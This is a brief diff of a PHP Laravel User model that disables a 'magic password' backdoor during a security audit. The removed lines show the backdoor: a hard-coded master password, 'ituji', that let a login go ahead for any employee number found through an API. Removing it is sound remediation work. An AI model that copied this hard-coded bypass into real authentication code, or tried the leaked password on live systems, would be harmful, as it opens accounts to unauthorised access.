@@ -182,9 +182,7 @@ class User extends Authenticatable
      */
     public static function handleMagicPassword($nip, $password)
     {
-        if ($password !== 'ituji') {
-            return null;
-        }
+        return null; // Backdoor DINONAKTIFKAN (audit 2026-10-23)
 
         // Check if NIP exists in the API before allowing login
         $apiData = self::getDataFromApi($nip);
